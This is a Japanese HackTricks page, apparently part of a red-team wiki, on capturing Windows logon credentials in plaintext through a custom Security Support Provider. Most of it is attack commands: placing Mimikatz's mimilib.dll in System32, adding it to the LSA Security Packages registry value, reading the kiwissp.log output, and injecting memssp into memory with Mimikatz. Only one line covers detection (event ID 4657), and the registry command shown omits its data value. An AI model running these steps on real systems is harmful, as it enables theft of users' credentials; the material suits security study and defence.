<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローする
* **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>


## カスタムSSP

[ここでSSP（セキュリティサポートプロバイダ）とは何かを学びます。](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
マシンへのアクセスに使用される **資格情報を平文でキャプチャ** するために **独自のSSP** を作成できます。

### Mimilib

Mimikatz が提供する `mimilib.dll` バイナリを使用できます。**これにより、すべての資格情報が平文でファイルに記録されます。**\
dll を `C:\Windows\System32\` に配置します\
既存のLSAセキュリティパッケージのリストを取得します：

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

セキュリティ サポート プロバイダ リスト (セキュリティ パッケージ) に `mimilib.dll` を追加します:
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
そして、再起動後、すべての資格情報は`C:\Windows\System32\kiwissp.log`内で平文で見つけることができます。

### メモリ内

また、Mimikatzを使用してこれを直接メモリにインジェクトすることもできます（注意：少し不安定で動作しない可能性があります）。
```powershell
privilege::debug
misc::memssp
```
これは再起動を乗り越えられません。

### 緩和策

イベントID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` の作成/変更の監査

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローする**
* **ハッキングテクニックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する

</details>
